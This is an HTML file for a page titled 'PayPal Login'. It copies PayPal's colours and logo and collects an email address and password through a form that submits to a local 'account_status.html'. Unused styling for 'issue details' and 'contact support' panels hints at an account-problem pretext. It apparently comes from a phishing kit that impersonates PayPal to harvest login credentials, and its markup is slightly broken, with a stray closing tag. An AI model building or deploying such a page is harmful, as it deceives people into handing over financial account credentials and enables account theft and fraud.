<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 400px;
            text-align: center;
        }
        h2 {
            color: #003087;
        }
        p {
            color: #555555;
            margin: 20px 0;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #555555;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #cccccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .input-group input:focus {
            border-color: #003087;
            outline: none;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #003087;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #002157;
        }
        .forgot-password {
            margin-top: 10px;
            text-align: center;
            color: #003087;
            text-decoration: none;
        }
        .issue-details {
            background-color: #f9f9f9;
            border: 1px solid #dddddd;
            padding: 10px;
            border-radius: 4px;
            margin-top: 20px;
        }
        .issue-details p {
            margin: 5px 0;
        }
        .contact-support {
            margin-top: 20px;
        }
        .contact-support a {
            color: #003087;
            text-decoration: none;
        }
        .contact-support a:hover {
            text-decoration: underline;
        }
        .logo {
            max-width: 100%;
            height: auto;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <img src="paypal_logo.png" alt="PayPal Logo" class="logo">
    <h2>PayPal Login</h2>
    <form id="loginForm" action="account_status.html">
        <div class="input-group">
            <label for="email">Email</label>
            <input type="email" id="email" name="email" required>
        </div>
        <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" required>
        </div>
        <button type="submit">Log In</button>
    </form>
    <a href="#" class="forgot-password">Forgot your password?</a>
</div>
